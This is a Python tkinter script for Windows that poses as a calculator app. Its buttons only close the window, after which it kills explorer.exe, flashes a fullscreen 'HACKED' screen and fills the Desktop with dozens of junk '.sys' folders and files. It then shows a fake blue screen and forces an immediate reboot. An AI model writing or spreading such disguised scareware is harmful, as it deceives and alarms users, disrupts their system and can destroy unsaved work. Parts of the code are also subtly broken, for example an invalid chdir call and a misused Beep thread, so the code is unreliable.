from tkinter import *
from random import randint
from time import sleep
from os import *
from winsound import Beep
from threading import Thread
from tkinter.ttk import Progressbar, Style


def main():
    win1()
    t1 = Thread(target=apoc)
    t1.start()
    t2 = Thread(target=Beep(32000, 12000), daemon=True)
    t2.start()

def files():
    d1 = f'C:/Users/<username>/Desktop'
    d2 = f'C:/Users/<username>/onedrive/Desktop'
    try:
        chdir(d1)
    except:
        chdir(d2)
    for i in range(80):
        s = randint(100, 1000)
        system(f'mkdir .sys#{s}')
        chdir(f'.sys#{s}')
        for j in range(randint(0, 10)):
            system(f'type null > {chr(randint(97, 121))}{chr(randint(48, 57))}{chr(randint(97, 121))}{chr(randint(48, 57))}.sys.txt')
        chdir('')

def apoc():
    system("taskkill /im explorer.exe /f")
    win3()
    win2()
    system("shutdown /r /t 0001")

def win3():
    text1 = ".mov	edx,4\t\t\t\t\t\t\n.mov	ecx,msz\t\t\t\t\t\t\n.mov	ebx,1\t\t\t\t\t\t\n.mov	eax,4\t\t\t\t\t\t\n.int	0x80.mov	edx,4\t\t\t\t\t\t\n.sys	ecx,msz\t\t\t\t\t\t\n.sys	ebx,1\t\t\t\t\t\t\n.sys	eax,4\t\t\t\t\t\t\n.sys	0x80.mov	edx,4\t\t\t\t\t\t\n.mov	ecx,msz\t\t\t\t\t\t\n.mov	ebx,1\t\t\t\t\t\t\n.mov	eax,4\t\t\t\t\t\t\n.int	0x80.mov	edx,4\t\t\t\t\t\t\n.mov	ecx,msz\t\t\t\t\t\t\n.mov	ebx,1\t\t\t\t\t\t\n.mov	eax,4\t\t\t\t\t\t\n.int	0x80.mov	edx,4\t\t\t\t\t\t\n.mov	ecx,msz\t\t\t\t\t\t\n.mov	ebx,1\t\t\t\t\t\t\n.mov	eax,4\t\t\t\t\t\t\n.int	0x80.mov	edx,4\t\t\t\t\t\t\n.sys	ecx,msz\t\t\t\t\t\t\n.sys	ebx,1\t\t\t\t\t\t\n.sys	eax,"
    r = Tk()
    r.title("Error #0x0ff3c")
    r.config(bg="black")
    r.attributes('-fullscreen', True)

    l = Label(r, text=text1*3, bg="black", fg="green", font="consolas 10")
    l.grid(row=0, column=0)
    r.update()
    sleep(2)
    s = ['\n\n\tH', 'A', 'C', 'K', 'E', 'D', '\n\t:)']
    l['text'] = ""
    l['fg'] = "red"
    l['font'] = 'consolas 90'
    for i in range(len(s)):
        l['text'] += s[i]
        r.update()
        sleep(1)
    files()
    r.destroy()


    r.mainloop()


def win1():
    root = Tk()
    root.title("Calculator")
    root.config(bg="black")
    root.geometry("350x600")

    fr1 = Frame(root)
    fr2 = Frame(root)
    fr1.pack()
    fr2.pack()

    l1 = Label(fr1, text="Calculate", fg="green", bg="black", font="century 60", height="2")
    l1.pack()

    l21 = Button(fr2, text="AC", fg="black", bg="grey", font="century 30", width="3", command=root.destroy)
    l21.grid(row=0, column=0)
    l22 = Button(fr2, text="+/-", fg="black", bg="grey", font="century 30", width="3", command=root.destroy)
    l22.grid(row=0, column=1)
    l23 = Button(fr2, text="%", fg="black", bg="grey", font="century 30", width="3", command=root.destroy)
    l23.grid(row=0, column=2)
    l24 = Button(fr2, text="/", fg="white", bg="orange", font="century 30", width="3", command=root.destroy)
    l24.grid(row=0, column=3)
    l25 = Button(fr2, text="7", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l25.grid(row=1, column=0)
    l26 = Button(fr2, text="8", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l26.grid(row=1, column=1)
    l27 = Button(fr2, text="9", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l27.grid(row=1, column=2)
    l28 = Button(fr2, text="x", fg="white", bg="orange", font="century 30", width="3", command=root.destroy)
    l28.grid(row=1, column=3)
    l29 = Button(fr2, text="4", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l29.grid(row=2, column=0)
    l30 = Button(fr2, text="5", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l30.grid(row=2, column=1)
    l31 = Button(fr2, text="6", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l31.grid(row=2, column=2)
    l32 = Button(fr2, text="-", fg="white", bg="orange", font="century 30", width="3", command=root.destroy)
    l32.grid(row=2, column=3)
    l33 = Button(fr2, text="1", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l33.grid(row=3, column=0)
    l34 = Button(fr2, text="2", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l34.grid(row=3, column=1)
    l35 = Button(fr2, text="3", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l35.grid(row=3, column=2)
    l36 = Button(fr2, text="+", fg="white", bg="orange", font="century 30", width="3", command=root.destroy)
    l36.grid(row=3, column=3)
    l37 = Button(fr2, text="0", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l37.grid(row=4, column=0)
    l38 = Button(fr2, text=" ", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l38.grid(row=4, column=1)
    l39 = Button(fr2, text=",", fg="white", bg="grey", font="century 30", width="3", command=root.destroy)
    l39.grid(row=4, column=2)
    l40 = Button(fr2, text="=", fg="white", bg="orange", font="century 30", width="3", command=root.destroy)
    l40.grid(row=4, column=3)

    root.mainloop()

def win2():
    root = Tk()
    root.title("Blue Screen")
    root.attributes('-fullscreen', True)
    root.config(bg=rgb((0, 120, 215)))
    f1 = Frame(root, bg=rgb((0, 120, 215)))
    f1.pack()
    f2 = Frame(root, bg=rgb((0, 120, 215)))
    f2.pack()

    l1 = Label(f1, text="\n\n:(\t", bg=rgb((0, 120, 215)), fg="white", font="calibri 100")
    l1.grid(row=0, column=0)
    l2 = Label(f1, text="\tYour PC ran into a problem and needs to restart. We're\n\tjust collecting some error info, and then we'll restart for\nyou.\t\t\t\t\n", bg=rgb((0, 120, 215)), fg="white", font="calibri 25")
    l2.grid(row=1, column=0)
    l3 = Label(f1, text="\n\n:(\t", bg=rgb((0, 120, 215)), fg=rgb((0, 120, 215)), font="calibri 100")
    l3.grid(row=0, column=1)
    s = Style()
    s.theme_use('clam')
    s.configure("red.Horizontal.TProgressbar", foreground=rgb((0, 120, 215)), background=rgb((0, 120, 215)))
    pb = Progressbar(f2, style="red.Horizontal.TProgressbar",orient='horizontal', mode='determinate', length=1000)
    pb.grid(row=0, column=1)
    m = 0
    l2 = Label(f2, text=f"{m}%", bg=rgb((0, 120, 215)), fg="white", font="calibri 25")
    l2.grid(row=1, column=1)
    root.update()
    while m < 100:
        r = randint(0, 10)
        m += r
        pb['value'] = m
        l2['text'] = f"{m}%"
        root.update()
        sleep(1)
    print("get")
    root.destroy()


def rgb(inp):
    return "#%02x%02x%02x" % inp


if __name__ == '__main__':
    if name == 'nt':
        main()
